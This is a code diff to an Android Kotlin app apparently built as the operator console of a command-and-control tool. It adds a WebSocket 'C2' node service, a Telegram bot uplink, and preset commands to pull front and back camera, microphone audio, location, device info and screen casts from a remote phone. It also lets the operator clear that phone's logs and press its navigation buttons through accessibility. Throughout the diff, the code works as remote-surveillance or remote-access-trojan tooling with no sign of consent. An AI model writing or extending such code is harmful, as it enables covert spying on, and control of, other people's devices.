@@ -1,3 +1,4 @@
+--- START OF FILE app/src/main/java/com/c2c/MainActivity.kt ---
 package com.c2c
 
 import android.Manifest
@@ -5,6 +6,7 @@ import android.annotation.SuppressLint
 import android.app.Application
 import android.app.NotificationChannel
 import android.app.NotificationManager
+import android.app.PendingIntent
 import android.app.Service
 import android.content.Context
 import android.content.Intent
@@ -101,6 +103,7 @@ import kotlinx.coroutines.Job
 import kotlinx.coroutines.channels.Channel
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.flow.MutableSharedFlow
+import kotlinx.coroutines.flow.MutableStateFlow
 import kotlinx.coroutines.isActive
 import kotlinx.coroutines.launch
 import org.json.JSONArray
@@ -131,7 +134,13 @@ object ServerCore {
     val liveSessions = CopyOnWriteArrayList<WebSocketServerSession>()
     val logsFlow = MutableSharedFlow<String>(replay = 50)
     val streamFlow = MutableSharedFlow<ByteArray>(replay = 5)
-    var isRunning = false
+    
+    // Using StateFlow so UI updates instantly when notification kills the server
+    val isRunningFlow = MutableStateFlow(false)
+    var isRunning: Boolean
+        get() = isRunningFlow.value
+        set(value) { isRunningFlow.value = value }
+        
     var lastStatusSlab = "System Ready. Waiting for link..."
 
     fun log(msg: String, isSuccess: Boolean? = null) {
@@ -142,37 +151,72 @@ object ServerCore {
 }
 
 class C2ServerService : Service() {
+    companion object { const val ACTION_STOP = "STOP_NODE" }
+
     override fun onCreate() {
         super.onCreate()
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            getSystemService(NotificationManager::class.java).createNotificationChannel(NotificationChannel("c2c_server", "Core Node Service", NotificationManager.IMPORTANCE_LOW))
+            getSystemService(NotificationManager::class.java).createNotificationChannel(
+                NotificationChannel("c2c_server", "Core Node Service", NotificationManager.IMPORTANCE_LOW)
+            )
         }
     }
+
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        val port = intent?.getIntExtra("port", 8765) ?: 8765
-        val notification = NotificationCompat.Builder(this, "c2c_server").setContentTitle("Core Node Active").setContentText("Listening on port $port").setSmallIcon(android.R.drawable.ic_dialog_info).build()
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) startForeground(1, notification, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC) else startForeground(1, notification)
-        if (!ServerCore.isRunning) {
-            try {
-                ServerCore.ktorServer = embeddedServer(io.ktor.server.cio.CIO, port = port, host = "0.0.0.0") {
-                    install(WebSockets)
-                    routing {
-                        webSocket("/live") {
-                            ServerCore.liveSessions.add(this)
-                            ServerCore.log("LINK ESTABLISHED: ${call.request.local.remoteHost}", true)
-                            try { for (frame in incoming) { if (frame is Frame.Binary) ServerCore.streamFlow.emit(frame.readBytes()) } } 
-                            finally { ServerCore.liveSessions.remove(this); ServerCore.log("LINK SEVERED", false) }
-                        }
-                    }
-                }.start(wait = false)
-                ServerCore.isRunning = true
-                ServerCore.log("NODE STARTED ON 0.0.0.0:$port", true)
-            } catch (e: Exception) { ServerCore.log("NODE CRASH: ${e.message}", false) }
+        if (intent?.action == ACTION_STOP) {
+            stopKtor()
+            stopSelf()
+            return START_NOT_STICKY
         }
+
+        val port = intent?.getIntExtra("port", 8765) ?: 8765
+        
+        // Notification Kill Switch
+        val stopIntent = Intent(this, C2ServerService::class.java).apply { action = ACTION_STOP }
+        val stopPendingIntent = PendingIntent.getService(this, 0, stopIntent, PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT)
+
+        val notification = NotificationCompat.Builder(this, "c2c_server")
+            .setContentTitle("C2C Node Active")
+            .setContentText("Listening on port $port")
+            .setSmallIcon(android.R.drawable.ic_dialog_info)
+            .addAction(android.R.drawable.ic_menu_close_clear_cancel, "TERMINATE NODE", stopPendingIntent)
+            .build()
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) startForeground(1, notification, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC) 
+        else startForeground(1, notification)
+
+        startKtor(port)
         return START_STICKY
     }
+
+    private fun startKtor(port: Int) {
+        if (ServerCore.isRunning) return
+        try {
+            ServerCore.ktorServer = embeddedServer(io.ktor.server.cio.CIO, port = port, host = "0.0.0.0") {
+                install(WebSockets)
+                routing {
+                    webSocket("/live") {
+                        ServerCore.liveSessions.add(this)
+                        ServerCore.log("LINK ESTABLISHED: ${call.request.local.remoteHost}", true)
+                        try { for (frame in incoming) { if (frame is Frame.Binary) ServerCore.streamFlow.emit(frame.readBytes()) else if (frame is Frame.Text) ServerCore.log("RECV: ${frame.readText()}")} } 
+                        finally { ServerCore.liveSessions.remove(this); ServerCore.log("LINK SEVERED", false) }
+                    }
+                }
+            }.start(wait = false)
+            ServerCore.isRunning = true
+            ServerCore.log("NODE STARTED ON 0.0.0.0:$port", true)
+        } catch (e: Exception) { ServerCore.log("NODE CRASH: ${e.message}", false) }
+    }
+
+    private fun stopKtor() {
+        ServerCore.ktorServer?.stop(1000, 2000)
+        ServerCore.isRunning = false
+        ServerCore.liveSessions.clear()
+        ServerCore.log("NODE TERMINATED.", false)
+    }
+
     override fun onDestroy() {
-        ServerCore.ktorServer?.stop(1000, 2000); ServerCore.isRunning = false; ServerCore.liveSessions.clear(); ServerCore.log("NODE TERMINATED.", false)
+        stopKtor()
         super.onDestroy()
     }
     override fun onBind(intent: Intent?): IBinder? = null
@@ -243,11 +287,21 @@ class CoreViewModel(application: Application) : AndroidViewModel(application) {
                 val cmdArr = JSONArray(rawCmds); for (i in 0 until cmdArr.length()) { pushMessages.add(jsonToCmd(cmdArr.getJSONObject(i))) }
             } catch (e: Exception) {}
         } else {
+            // Pre-populate JSON with exactly what the user requested in the table
             topPanelCommands.add(PushMessage(1, "Flash", "flash", "on", "flashlight", true, "Flash Off", "flash", "off"))
-            topPanelCommands.add(PushMessage(2, "Screen", "screen", "on", "light_mode", true, "Screen Off", "screen", "off"))
+            topPanelCommands.add(PushMessage(2, "Ping Node", "ping", "", "radar"))
             topPanelCommands.add(PushMessage(3, "Location", "loc", "", "location_on"))
-            pushMessages.add(PushMessage(4, "Wake Device", "live_start", "", "code"))
-            pushMessages.add(PushMessage(5, "Toggle WiFi", "wifi_toggle", "", "wifi"))
+            topPanelCommands.add(PushMessage(4, "Volume", "vol", "100", "volume_up", true, "Mute", "vol", "0"))
+            
+            pushMessages.add(PushMessage(10, "Wake/Live Node", "live_start", "ws://0.0.0.0:8765/live", "router"))
+            pushMessages.add(PushMessage(11, "Kill Node", "live_stop", "", "power_settings_new"))
+            pushMessages.add(PushMessage(12, "Cam Front", "cam_front", "", "camera_front"))
+            pushMessages.add(PushMessage(13, "Cam Back", "cam_back", "", "camera_rear"))
+            pushMessages.add(PushMessage(14, "Record Mic", "mic", "15", "mic"))
+            pushMessages.add(PushMessage(15, "Full Info", "info", "", "info"))
+            pushMessages.add(PushMessage(16, "Fetch Logs", "get_log", "", "description"))
+            pushMessages.add(PushMessage(17, "Clear Logs", "clear_log", "", "delete_sweep"))
+            
             exportConfigToJson().let { importConfigFromJson(it) }
         }
     }
@@ -284,7 +338,8 @@ class CoreViewModel(application: Application) : AndroidViewModel(application) {
 
     fun toggleServer(context: Context) {
         val intent = Intent(context, C2ServerService::class.java).apply { putExtra("port", prefs.getInt("port", 8765)) }
-        if (ServerCore.isRunning) { context.stopService(intent) } else { if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) context.startForegroundService(intent) else context.startService(intent) }
+        if (ServerCore.isRunning) { context.stopService(intent) } 
+        else { if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) context.startForegroundService(intent) else context.startService(intent) }
     }
 
     @SuppressLint("MissingPermission")
@@ -330,9 +385,7 @@ class CoreViewModel(application: Application) : AndroidViewModel(application) {
                             val msg = update.optJSONObject("message")?.optString("text", "")
                             val date = update.optJSONObject("message")?.optLong("date", System.currentTimeMillis()/1000) ?: (System.currentTimeMillis()/1000)
                             val fromId = update.optJSONObject("message")?.optJSONObject("from")?.optString("id", "")
-                            if (!msg.isNullOrBlank()) {
-                                tgMessages.add(TgMessage(tgOffset, msg, fromId == chatId, date * 1000))
-                            }
+                            if (!msg.isNullOrBlank()) tgMessages.add(TgMessage(tgOffset, msg, fromId == chatId, date * 1000))
                         }
                     }
                 } catch (e: CancellationException) { throw e } catch (e: Exception) { delay(5000) }
@@ -361,6 +414,16 @@ fun getIconByName(name: String): ImageVector {
         "wifi" -> Icons.Rounded.Wifi
         "bluetooth" -> Icons.Rounded.Bluetooth
         "folder" -> Icons.Rounded.FolderOpen
+        "radar" -> Icons.Rounded.Radar
+        "camera_front" -> Icons.Rounded.CameraFront
+        "camera_rear" -> Icons.Rounded.CameraRear
+        "mic" -> Icons.Rounded.Mic
+        "info" -> Icons.Rounded.Info
+        "description", "log" -> Icons.Rounded.Description
+        "delete_sweep", "clear" -> Icons.Rounded.DeleteSweep
+        "power_settings_new", "power" -> Icons.Rounded.PowerSettingsNew
+        "router", "server" -> Icons.Rounded.Router
+        "volume_up", "vol" -> Icons.Rounded.VolumeUp
         else -> Icons.Rounded.Code
     }
 }
@@ -427,14 +490,13 @@ fun MainScreen(viewModel: CoreViewModel) {
 fun CommandsPager(viewModel: CoreViewModel) {
     val pagerState = rememberPagerState(pageCount = { 2 })
     HorizontalPager(state = pagerState, modifier = Modifier.fillMaxSize()) { page ->
-        if (page == 0) CommandsTab(viewModel, onSwipeRequest = { /* Handle manual swipe indicator if needed */ })
-        else TelegramCloneTab(viewModel, onBack = { /* Optional back button behavior */ })
+        if (page == 0) CommandsTab(viewModel) else TelegramCloneTab(viewModel)
     }
 }
 
 @OptIn(ExperimentalFoundationApi::class)
 @Composable
-fun CommandsTab(viewModel: CoreViewModel, onSwipeRequest: () -> Unit) {
+fun CommandsTab(viewModel: CoreViewModel) {
     val context = LocalContext.current
     var volLevel by remember { mutableFloatStateOf(50f) }
     var argPromptCommand by remember { mutableStateOf<PushMessage?>(null) }; var runtimeArg by remember { mutableStateOf("") }
@@ -452,7 +514,7 @@ fun CommandsTab(viewModel: CoreViewModel, onSwipeRequest: () -> Unit) {
     Column(modifier = Modifier.fillMaxSize().padding(16.dp)) {
         Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
             Text("Control Matrix", fontSize = 24.sp, fontWeight = FontWeight.Bold, color = TextPrimary, fontFamily = UbuntuFont)
-            Text("Swipe for Telegram >", color = TextSecondary, fontSize = 12.sp, fontFamily = UbuntuFont)
+            Text("Swipe for Uplink ⯈", color = TextSecondary, fontSize = 12.sp, fontFamily = UbuntuFont)
         }
         Spacer(modifier = Modifier.height(16.dp))
         
@@ -510,7 +572,7 @@ fun CommandsTab(viewModel: CoreViewModel, onSwipeRequest: () -> Unit) {
 // ---- Telegram 1:1 Clone Tab ----
 @OptIn(ExperimentalMaterial3Api::class)
 @Composable
-fun TelegramCloneTab(viewModel: CoreViewModel, onBack: () -> Unit) {
+fun TelegramCloneTab(viewModel: CoreViewModel) {
     var inputTxt by remember { mutableStateOf("") }
     val listState = rememberLazyListState()
     LaunchedEffect(viewModel.tgMessages.size) { if(viewModel.tgMessages.isNotEmpty()) listState.animateScrollToItem(viewModel.tgMessages.size - 1) }
@@ -528,11 +590,11 @@ fun TelegramCloneTab(viewModel: CoreViewModel, onBack: () -> Unit) {
                             Spacer(modifier = Modifier.width(6.dp))
                             Text("bot", color = TextSecondary, fontSize = 12.sp, modifier = Modifier.background(Color(0xFF2B3A4C), RoundedCornerShape(4.dp)).padding(horizontal = 4.dp))
                         }
-                        Text("bot", color = TextSecondary, fontSize = 13.sp, fontFamily = UbuntuFont)
+                        Text(viewModel.tgBotUser, color = TextSecondary, fontSize = 13.sp, fontFamily = UbuntuFont)
                     }
                 }
             },
-            navigationIcon = { IconButton(onClick = onBack) { Icon(Icons.Rounded.ArrowBack, null, tint = Color.White) } },
+            navigationIcon = { IconButton(onClick = { /* User swipes to go back */ }) { Icon(Icons.Rounded.ArrowBack, null, tint = Color.White) } },
             actions = { IconButton(onClick = {}) { Icon(Icons.Rounded.MoreVert, null, tint = Color.White) } },
             colors = TopAppBarDefaults.topAppBarColors(containerColor = TgHeader)
         )
@@ -580,16 +642,128 @@ fun TelegramCloneTab(viewModel: CoreViewModel, onBack: () -> Unit) {
     }
 }
 
+@OptIn(ExperimentalFoundationApi::class)
 @Composable
 fun ServerTab(viewModel: CoreViewModel) {
     val context = LocalContext.current
+    val pagerState = rememberPagerState(pageCount = { 2 })
+    
+    // Check if server is running via StateFlow so UI updates instantly if killed from notification
+    val isRunning by ServerCore.isRunningFlow.collectAsState()
+
+    Column(modifier = Modifier.fillMaxSize()) {
+        TabRow(
+            selectedTabIndex = pagerState.currentPage,
+            containerColor = Color.Transparent,
+            contentColor = PremiumTeal,
+            indicator = { tabPositions -> TabRowDefaults.Indicator(Modifier.tabIndicatorOffset(tabPositions[pagerState.currentPage]), color = PremiumTeal) }
+        ) {
+            Tab(selected = pagerState.currentPage == 0, onClick = { /* Swipe controlled */ }, text = { Text("TERMINAL", fontFamily = UbuntuFont, color = if(pagerState.currentPage == 0) PremiumTeal else TextSecondary) })
+            Tab(selected = pagerState.currentPage == 1, onClick = { /* Swipe controlled */ }, text = { Text("LIVE CONTROLS", fontFamily = UbuntuFont, color = if(pagerState.currentPage == 1) PremiumTeal else TextSecondary) })
+        }
+
+        HorizontalPager(state = pagerState, modifier = Modifier.weight(1f)) { page ->
+            if (page == 0) TerminalPage(viewModel, context, isRunning) else LiveControlPage(viewModel, context)
+        }
+    }
+}
+
+@Composable
+fun TerminalPage(viewModel: CoreViewModel, context: Context, isRunning: Boolean) {
+    val listState = rememberLazyListState()
+    LaunchedEffect(viewModel.serverLogs.size) { if(viewModel.serverLogs.isNotEmpty()) listState.animateScrollToItem(viewModel.serverLogs.size - 1) }
+
     Column(modifier = Modifier.fillMaxSize().padding(16.dp)) {
-        Text("Node Connection", fontSize = 24.sp, fontWeight = FontWeight.Bold, color = TextPrimary, fontFamily = UbuntuFont); Spacer(modifier = Modifier.height(16.dp))
-        GlassButton(if (ServerCore.isRunning) "TERMINATE NODE" else "INITIALIZE NODE", Icons.Rounded.PowerSettingsNew, if (ServerCore.isRunning) PremiumRose else ActionBlue, Modifier.height(56.dp)) { viewModel.toggleServer(context) }
+        GlassButton(if (isRunning) "TERMINATE NODE" else "INITIALIZE NODE", Icons.Rounded.PowerSettingsNew, if (isRunning) PremiumRose else ActionBlue, Modifier.height(56.dp)) { viewModel.toggleServer(context) }
         Spacer(modifier = Modifier.height(16.dp))
-        Text("System Event Log", color = TextSecondary, fontSize = 14.sp, fontFamily = UbuntuFont)
+        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
+            Text("System Event Log", color = TextSecondary, fontSize = 14.sp, fontFamily = UbuntuFont)
+            IconButton(onClick = { viewModel.serverLogs.clear() }) { Icon(Icons.Rounded.DeleteOutline, null, tint = TextSecondary) }
+        }
         GlassCard(modifier = Modifier.fillMaxWidth().weight(1f).padding(top=8.dp)) {
-            LazyColumn(modifier = Modifier.padding(12.dp)) { items(viewModel.serverLogs) { log -> val color = if (log.contains("ERROR") || log.contains("FAIL")) PremiumRose else if (log.contains("SUCCESS") || log.contains("ESTABLISHED")) PremiumTeal else TextPrimary; Text(log, color = color, fontSize = 12.sp, lineHeight = 16.sp, modifier = Modifier.padding(vertical = 2.dp), fontFamily = CyberFont) } }
+            LazyColumn(state = listState, modifier = Modifier.padding(12.dp)) { items(viewModel.serverLogs) { log -> val color = if (log.contains("ERROR") || log.contains("FAIL") || log.contains("SEVERED")) PremiumRose else if (log.contains("SUCCESS") || log.contains("ESTABLISHED")) PremiumTeal else TextPrimary; Text(log, color = color, fontSize = 12.sp, lineHeight = 16.sp, modifier = Modifier.padding(vertical = 2.dp), fontFamily = CyberFont) } }
+        }
+    }
+}
+
+@Composable
+fun LiveControlPage(viewModel: CoreViewModel, context: Context) {
+    var showAudioModal by remember { mutableStateOf(false) }
+    var showScreenCast by remember { mutableStateOf(false) }
+    var runtimeArg by remember { mutableStateOf("") }
+    var promptVibrate by remember { mutableStateOf(false) }
+
+    if (showAudioModal) AudioControlModal(viewModel, context) { showAudioModal = false }
+    if (showScreenCast) ScreenCastOverlay(viewModel) { showScreenCast = false }
+
+    if (promptVibrate) {
+        AlertDialog(
+            onDismissRequest = { promptVibrate = false }, containerColor = Color(0xFF1E293B),
+            title = { Text("Vibrate Duration (ms)", color = TextPrimary) },
+            text = { OutlinedTextField(value = runtimeArg, onValueChange = { runtimeArg = it }) },
+            confirmButton = { TextButton(onClick = { viewModel.sendLive("vibrate", runtimeArg); promptVibrate = false; runtimeArg = "" }) { Text("EXECUTE", color = PremiumTeal) } }
+        )
+    }
+
+    Column(modifier = Modifier.fillMaxSize().padding(16.dp)) {
+        Text("Active Media Streams", fontSize = 14.sp, color = TextSecondary, fontFamily = UbuntuFont); Spacer(modifier = Modifier.height(8.dp))
+        LazyVerticalGrid(columns = GridCells.Fixed(2), horizontalArrangement = Arrangement.spacedBy(8.dp), verticalArrangement = Arrangement.spacedBy(8.dp)) {
+            item { GlassButton("Audio Hub", Icons.Rounded.Mic, PremiumTeal) { showAudioModal = true } }
+            item { GlassButton("Screen Cast", Icons.Rounded.Cast, ActionBlue) { showScreenCast = true; viewModel.sendLive("live_screen_cast", "start") } }
+            item { GlassButton("Cam Front", Icons.Rounded.CameraFront) { viewModel.sendLive("stream_cam_front", "start") } }
+            item { GlassButton("Cam Back", Icons.Rounded.CameraRear) { viewModel.sendLive("stream_cam_back", "start") } }
+        }
+        Spacer(modifier = Modifier.height(24.dp))
+        Text("Environment", fontSize = 14.sp, color = TextSecondary, fontFamily = UbuntuFont); Spacer(modifier = Modifier.height(8.dp))
+        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
+            GlassButton("Vibrate Device", null, TextPrimary, Modifier.weight(1f)) { promptVibrate = true }
+            GlassButton("Sensors On", null, TextPrimary, Modifier.weight(1f)) { viewModel.sendLive("stream_sensors", "start") }
+        }
+        Spacer(modifier = Modifier.height(24.dp))
+        Text("Accessibility Navigation", fontSize = 14.sp, color = TextSecondary, fontFamily = UbuntuFont); Spacer(modifier = Modifier.height(8.dp))
+        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
+            GlassButton("BACK", null, PremiumTeal, Modifier.weight(1f)) { viewModel.sendLive("btn_back") }
+            GlassButton("HOME", null, ActionBlue, Modifier.weight(1f)) { viewModel.sendLive("btn_home") }
+            GlassButton("RECENTS", null, PremiumTeal, Modifier.weight(1f)) { viewModel.sendLive("btn_recents") }
+        }
+    }
+}
+
+@Composable
+fun AudioControlModal(viewModel: CoreViewModel, context: Context, onDismiss: () -> Unit) {
+    Dialog(onDismissRequest = onDismiss) {
+        GlassCard(modifier = Modifier.fillMaxWidth()) {
+            Column(modifier = Modifier.padding(24.dp), horizontalAlignment = Alignment.CenterHorizontally) {
+                Text("Audio Control Matrix", fontSize = 18.sp, color = ActionBlue, fontFamily = UbuntuFont); Spacer(modifier = Modifier.height(24.dp))
+                Row(horizontalArrangement = Arrangement.SpaceEvenly, modifier = Modifier.fillMaxWidth()) {
+                    GlassButton("CALL", null, PremiumTeal, Modifier.weight(1f)) { viewModel.sendLive("live_audio_mode", "call"); viewModel.startMic() }
+                    Spacer(modifier = Modifier.width(8.dp))
+                    GlassButton("LISTEN", null, PremiumTeal, Modifier.weight(1f)) { viewModel.sendLive("live_audio_mode", "mic") }
+                }
+                Spacer(modifier = Modifier.height(8.dp))
+                GlassButton("MEDIA (INTERNAL)", null, TextPrimary) { viewModel.sendLive("live_audio_mode", "media") }
+                Spacer(modifier = Modifier.height(16.dp))
+                GlassButton("TERMINATE AUDIO", Icons.Rounded.Close, PremiumRose) { viewModel.sendLive("live_audio_mode", "off"); viewModel.stopMic(); onDismiss() }
+            }
+        }
+    }
+}
+
+@Composable
+fun ScreenCastOverlay(viewModel: CoreViewModel, onDismiss: () -> Unit) {
+    var offsetX by remember { mutableFloatStateOf(0f) }; var offsetY by remember { mutableFloatStateOf(0f) }
+    Dialog(onDismissRequest = { viewModel.sendLive("live_screen_cast", "stop"); onDismiss() }, properties = DialogProperties(usePlatformDefaultWidth = false, decorFitsSystemWindows = false)) {
+        Box(modifier = Modifier.fillMaxSize()) {
+            GlassCard(modifier = Modifier.offset { IntOffset(offsetX.roundToInt(), offsetY.roundToInt()) }.size(280.dp, 500.dp).pointerInput(Unit) { detectDragGestures { change, dragAmount -> change.consume(); offsetX += dragAmount.x; offsetY += dragAmount.y } }) {
+                Box(modifier = Modifier.fillMaxSize()) {
+                    if (viewModel.liveScreenFrame == null) CircularProgressIndicator(color = ActionBlue, modifier = Modifier.align(Alignment.Center))
+                    else {
+                        val bmp = BitmapFactory.decodeByteArray(viewModel.liveScreenFrame, 0, viewModel.liveScreenFrame!!.size)
+                        if (bmp != null) Image(bitmap = bmp.asImageBitmap(), contentDescription = "Cast", modifier = Modifier.fillMaxSize(), contentScale = ContentScale.Fit)
+                    }
+                    IconButton(onClick = { viewModel.sendLive("live_screen_cast", "stop"); onDismiss() }, modifier = Modifier.align(Alignment.TopEnd)) { Icon(Icons.Rounded.Close, null, tint = PremiumRose) }
+                }
+            }
         }
     }
 }
